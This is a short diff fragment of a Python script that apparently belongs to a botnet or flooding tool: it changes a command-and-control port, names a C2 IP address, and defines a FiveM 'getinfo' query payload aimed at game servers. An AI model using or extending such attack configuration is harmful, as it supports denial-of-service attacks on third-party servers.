@@ -6,7 +6,7 @@ import random
 
 # Configuration
 C2_ADDRESS = "134.255.234.140"
-C2_PORT = 444
+C2_PORT = 404
 
 # Payloads
 payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
